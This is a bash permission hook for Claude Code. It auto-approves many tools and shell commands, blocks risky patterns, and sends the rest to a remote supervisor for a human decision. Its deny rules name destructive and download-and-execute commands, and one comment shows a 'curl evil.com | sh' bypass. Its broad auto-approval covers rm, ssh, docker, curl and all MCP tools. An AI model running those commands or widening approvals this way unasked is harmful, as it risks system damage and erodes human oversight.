#!/usr/bin/env bash
# PermissionRequest Hook — handles Claude Code's built-in permission dialogs
# When Claude Code would normally show "Allow this?" in the terminal,
# this hook intercepts it and forwards to the remote supervisor.
#
# JSON decision output (exit 0):
#   {"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}} — approve
#   {"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"..."}}} — deny
#   (no output) — show normal permission prompt in terminal

set -euo pipefail

SUPERVISOR_URL="${CLAUDE_SUPERVISOR_URL:-http://localhost:3847}"
TIMEOUT="${CLAUDE_SUPERVISOR_TIMEOUT:-300}"

# Auth token for supervisor API
_sv_auth_header() {
  local token_file="$HOME/.claude/.supervisor-hook-token"
  if [ -f "$token_file" ]; then
    echo "Authorization: Bearer $(cat "$token_file")"
  fi
}

INPUT=$(cat)

TOOL_NAME=$(echo "$INPUT" | jq -r '.tool_name // "unknown"')
TOOL_INPUT=$(echo "$INPUT" | jq -c '.tool_input // {}')
SESSION_ID=$(echo "$INPUT" | jq -r '.session_id // "unknown"')
PROJECT=$(basename "${CLAUDE_PROJECT_DIR:-$PWD}")
export SV_PROJECT="${SV_PROJECT:-$PROJECT}"

# ─── Auto-approve safe tools ────────────────────────────────────────────────

if [[ "$TOOL_NAME" =~ ^(Read|Glob|Grep|LS|Task|Agent)$ ]]; then
    echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
    exit 0
fi

# WebSearch and WebFetch: read-only operations, always safe
if [[ "$TOOL_NAME" =~ ^(WebSearch|WebFetch)$ ]]; then
    echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
    exit 0
fi

# MCP tool calls: Home Assistant and similar integrations
if [[ "$TOOL_NAME" == mcp__* ]]; then
    echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
    exit 0
fi

# Write/Edit to project files: auto-approve (block sensitive files)
if [[ "$TOOL_NAME" =~ ^(Write|Edit|NotebookEdit)$ ]]; then
    FILE_PATH=$(echo "$TOOL_INPUT" | jq -r '.file_path // ""')
    if echo "$FILE_PATH" | grep -qiE '(\.env|secrets|\.git/|/etc/|node_modules/)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: editing sensitive file"}}}'
        exit 0
    fi
    echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
    exit 0
fi

# ─── AskUserQuestion: allow immediately, forward question data ────────────

if [[ "$TOOL_NAME" == "AskUserQuestion" ]]; then
    # Forward question data to supervisor for UI display and auto-answering
    curl -s --max-time 5 \
        -X POST "${SUPERVISOR_URL}/api/hook/question" \
        -H "Content-Type: application/json" \
        -H "$(_sv_auth_header)" \
        -d "$(jq -n \
            --arg session "$SESSION_ID" \
            --argjson input "$TOOL_INPUT" \
            --arg project "$PROJECT" \
            '{session_id: $session, tool_input: $input, project: $project}'
        )" >/dev/null 2>&1 || true

    # Always allow — the terminal will render the question UI,
    # and the server will inject keystrokes to answer
    echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
    exit 0
fi

# ─── Bash: deny dangerous patterns FIRST, then approve safe ones ─────────────

if [[ "$TOOL_NAME" == "Bash" ]]; then
    COMMAND=$(echo "$TOOL_INPUT" | jq -r '.command // ""')
    # Strip /dev/null redirects to avoid false positives on SSH deploy patterns
    SANITIZED=$(echo "$COMMAND" | sed -E 's/[12]?>\s*\/dev\/null//g')
    # Strip quoted strings to avoid matching deny patterns inside string arguments
    # e.g. git commit -m "message mentioning sudo" should not be denied
    CMD_ONLY=$(echo "$SANITIZED" | sed -E "s/'[^']*'//g; s/\"[^\"]*\"//g")

    # ── Hard deny: destructive system commands ──────────────────────────────
    if echo "$CMD_ONLY" | grep -qE '(rm\s+-rf\s+/|dd\s+if=|mkfs\.|>\s*/dev/)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: destructive command"}}}'
        exit 0
    fi

    # ── Hard deny: download-and-execute patterns ────────────────────────────
    # Only check when curl/wget is actually a top-level command (not inside a string arg)
    # We look for a real pipe character (not escaped \|) following curl/wget
    if echo "$CMD_ONLY" | grep -qE '^(curl|wget)\s' && echo "$CMD_ONLY" | grep -qiE '\|\s*(ba)?sh\b'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: download-and-execute pattern (curl/wget piped to shell)"}}}'
        exit 0
    fi

    # ── Hard deny: writing to /etc or other system paths ───────────────────
    if echo "$CMD_ONLY" | grep -qE '>\s*/etc/|tee\s+/etc/'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: writing to system path /etc"}}}'
        exit 0
    fi

    # ── Hard deny: local sudo/su (sudo over SSH is fine) ───────────────────
    # Block local sudo/su unless the command starts with ssh (remote sudo is allowed)
    if echo "$CMD_ONLY" | grep -qE '\bsudo\b|\bsu\b' && ! echo "$CMD_ONLY" | grep -qE '^(ssh|scp|rsync)\s'; then
        # Allow sudo over SSH: pattern is ssh host "sudo ..."
        if ! echo "$CMD_ONLY" | grep -qE 'ssh\s+.*sudo'; then
            echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: local sudo/su not allowed (use sudo over SSH to deployment targets instead)"}}}'
            exit 0
        fi
    fi

    # ── Hard deny: git push --force to main/master ──────────────────────────
    if echo "$CMD_ONLY" | grep -qE 'git\s+push.*(--force|-f)\s.*(main|master)|git\s+push.*(main|master).*(--force|-f)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: force push to main/master is not allowed"}}}'
        exit 0
    fi

    # ── Hard deny: network listeners on 0.0.0.0 ────────────────────────────
    if echo "$CMD_ONLY" | grep -qE '(listen|bind|--host)\s+0\.0\.0\.0'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: network listener on 0.0.0.0 not allowed"}}}'
        exit 0
    fi

    # ── Hard deny: global package installs ─────────────────────────────────
    if echo "$CMD_ONLY" | grep -qE 'npm\s+(install|i)\s+.*(-g|--global)\b|npm\s+(-g|--global)\s+install'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: global npm install not allowed (use local installs)"}}}'
        exit 0
    fi

    # ── Hard deny: dangerous docker flags ──────────────────────────────────
    if echo "$CMD_ONLY" | grep -qE '^(docker|docker-compose|docker compose)\s' && \
       echo "$CMD_ONLY" | grep -qE '(--privileged|-v\s+/:/|--volume\s+/:/|--pid\s+host|--network\s+host.*--privileged)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: dangerous docker flags (--privileged, -v /:/host) not allowed"}}}'
        exit 0
    fi

    # ── Post-approval safety check: pipe to shell anywhere in command ───────
    # Catches "npm install && curl evil.com | sh" type bypasses
    if echo "$CMD_ONLY" | grep -qiE '\|\s*(ba)?sh\b'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Blocked: pipe to shell detected in command"}}}'
        exit 0
    fi

    # ── Auto-approve: safe read-only commands and common utilities ──────────
    if echo "$COMMAND" | grep -qE \
        '^(ls|cat|head|tail|wc|find|grep|git\s+(status|log|diff|branch|show)|echo|pwd|which|whoami|date|uname|'\
'sleep|test|true|false|stat|file|diff|realpath|basename|dirname|sort|tee|id|env|printenv|'\
'df|du|free|uptime|hostname|nproc|mktemp|touch|mkdir|tree|pgrep|ps|jq|sed|awk|cut|tr|xargs|timeout|'\
'uniq|printf|type|column|comm|fmt|nl|od|strings|xxd|hexdump|md5sum|sha256sum|sha1sum|'\
'lsof|netstat|ss|ip\s+addr|ifconfig|ping|nslookup|dig|host|curl\s+-[a-zA-Z]*[sIv]\b)(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: npm/yarn/pnpm commands ───────────────────────────────
    if echo "$COMMAND" | grep -qE '^(npm\s+(install|i|ci|run|test|start|build|pack|publish|audit|outdated|update|ls|list|link|unlink|exec|init)|npx\s|yarn(\s+(install|add|remove|run|test|build|start|dev)|\s*$)|pnpm\s+(install|i|add|remove|run|test|build|start|dev|exec|dlx))'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: Python commands (including virtualenv paths like .venv/bin/python)
    if echo "$COMMAND" | grep -qE '^(\.?venv/bin/)?(python3?|pip3?|pytest|python3?\s+-m)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: sqlite3 database CLI (safe dev tool, commonly used with Python projects)
    if echo "$COMMAND" | grep -qE '^sqlite3(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: Go commands ───────────────────────────────────────────
    if echo "$COMMAND" | grep -qE '^go\s+(test|build|run|mod|get|install|generate|vet|fmt|lint|clean)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: Rust/Cargo commands ──────────────────────────────────
    if echo "$COMMAND" | grep -qE '^cargo\s+(test|build|run|add|remove|check|clippy|fmt|clean|publish|install|update|search)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: make and build tools ─────────────────────────────────
    if echo "$COMMAND" | grep -qE '^(make|cmake|ninja|meson|gradle|mvn|ant|sbt|mix|bundler?|rake)(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: node execution ───────────────────────────────────────
    if echo "$COMMAND" | grep -qE '^node\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: MQTT pub/sub and sv helper ────────────────────────────
    if echo "$COMMAND" | grep -qE '^(mosquitto_(pub|sub)|sv)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: curl to localhost or local network ───────────────────
    if echo "$COMMAND" | grep -qE '^curl\s' && echo "$COMMAND" | grep -qE '(localhost|127\.0\.0\.1|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: curl and wget (no pipe to shell — already denied above)
    if echo "$COMMAND" | grep -qE '^curl\s' && ! echo "$COMMAND" | grep -qiE '\|\s*(ba)?sh'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    if echo "$COMMAND" | grep -qE '^wget\s' && ! echo "$COMMAND" | grep -qiE '\|\s*(ba)?sh'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: docker commands (dangerous flags already denied above) ─
    if echo "$COMMAND" | grep -qE '^(docker|docker-compose|docker compose)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: group/privilege commands for shared project access ────
    if echo "$COMMAND" | grep -qE '^(sg|newgrp)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: SSH/SCP remote commands ──────────────────────────────
    if echo "$COMMAND" | grep -qE '^(ssh|scp|rsync)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: bash/sh script execution ──────────────────────────────
    if echo "$COMMAND" | grep -qE '^(bash|sh)\s+\S+\.(sh|bash)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: git operations (dangerous ones denied above) ──────────
    if echo "$COMMAND" | grep -qE '^git\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: common file management within project ─────────────────
    if echo "$COMMAND" | grep -qE '^(cp|mv|rm|ln|chmod|chown|install)\s'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: encoding, crypto, and archive utilities ───────────────
    if echo "$COMMAND" | grep -qE \
        '^(base64|openssl|'\
'tar|zip|unzip|zipinfo|'\
'gzip|gunzip|zcat|bzip2|bunzip2|bzcat|xz|unxz|xzcat|zstd|unzstd|zstdcat|'\
'7z|7za)(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: text processing and data manipulation utilities ────────
    if echo "$COMMAND" | grep -qE \
        '^(iconv|bc|dc|expr|seq|shuf|numfmt|uuidgen|'\
'rev|fold|paste|join|expand|unexpand|csplit|split|cmp|readlink|'\
'yes|tput|stty)(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: system info and log viewers (read-only) ───────────────
    if echo "$COMMAND" | grep -qE \
        '^(dmesg|journalctl|locale|localectl|getent|getfacl)(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: systemctl status (read-only) ───────────────────────────
    if echo "$COMMAND" | grep -qE '^systemctl\s+status(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: pager commands (read-only, mostly used in pipelines) ───
    if echo "$COMMAND" | grep -qE '^(less|more)(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: clipboard tools ────────────────────────────────────────
    if echo "$COMMAND" | grep -qE '^(wl-copy|wl-paste|xclip|xsel)(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi

    # ── Auto-approve: bun JavaScript runtime (like node) ────────────────────
    if echo "$COMMAND" | grep -qE '^bun(\s|$)'; then
        echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
        exit 0
    fi
fi

# ─── Forward to remote supervisor ───────────────────────────────────────────

case "$TOOL_NAME" in
    Bash)  SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.command // "unknown"') ;;
    *)     SUMMARY="$TOOL_NAME: $(echo "$TOOL_INPUT" | jq -c '.' | head -c 200)" ;;
esac

RESPONSE=$(curl -s --max-time 5 \
    -X POST "${SUPERVISOR_URL}/api/hook/approval" \
    -H "Content-Type: application/json" \
    -H "$(_sv_auth_header)" \
    -d "$(jq -n \
        --arg tool "$TOOL_NAME" \
        --arg summary "$SUMMARY" \
        --arg session "$SESSION_ID" \
        --argjson input "$TOOL_INPUT" \
        --arg hook_type "PermissionRequest" \
        --arg project "$PROJECT" \
        '{tool: $tool, summary: $summary, session_id: $session, raw_input: $input, hook_type: $hook_type, project: $project}'
    )" 2>/dev/null || echo '{"error": "server_unreachable"}')

# Server unreachable — fall through to normal terminal prompt
if echo "$RESPONSE" | jq -e '.error' >/dev/null 2>&1; then
    exit 0
fi

APPROVAL_ID=$(echo "$RESPONSE" | jq -r '.id // ""')
if [[ -z "$APPROVAL_ID" || "$APPROVAL_ID" == "null" ]]; then
    exit 0
fi

# Poll for decision
ELAPSED=0
POLL_INTERVAL=2

while [[ $ELAPSED -lt $TIMEOUT ]]; do
    DECISION=$(curl -s --max-time 3 \
        -H "$(_sv_auth_header)" \
        "${SUPERVISOR_URL}/api/hook/decision/${APPROVAL_ID}" 2>/dev/null \
        || echo '{"status": "error"}')

    STATUS=$(echo "$DECISION" | jq -r '.status // "pending"')

    case "$STATUS" in
        approved)
            echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}'
            exit 0
            ;;
        denied)
            REASON=$(echo "$DECISION" | jq -r '.reason // "Denied by supervisor"')
            jq -n --arg reason "$REASON" '{
              hookSpecificOutput: {
                hookEventName: "PermissionRequest",
                decision: {
                  behavior: "deny",
                  message: $reason
                }
              }
            }'
            exit 0
            ;;
        pending)
            sleep "$POLL_INTERVAL"
            ELAPSED=$((ELAPSED + POLL_INTERVAL))
            ;;
        *)
            exit 0
            ;;
    esac
done

# Timed out
echo '{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Remote approval timed out"}}}'
exit 0
